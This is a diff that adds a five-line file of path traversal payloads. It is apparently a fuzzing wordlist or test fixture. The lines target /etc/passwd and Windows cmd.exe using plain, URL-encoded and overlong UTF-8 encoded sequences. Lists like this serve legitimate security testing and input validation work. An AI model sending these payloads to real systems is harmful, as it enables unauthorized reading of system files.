@@ -1,0 +1,5 @@
+../../../../etc/passwd
+..\\..\\..\\windows\\system32\\cmd.exe
+/../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
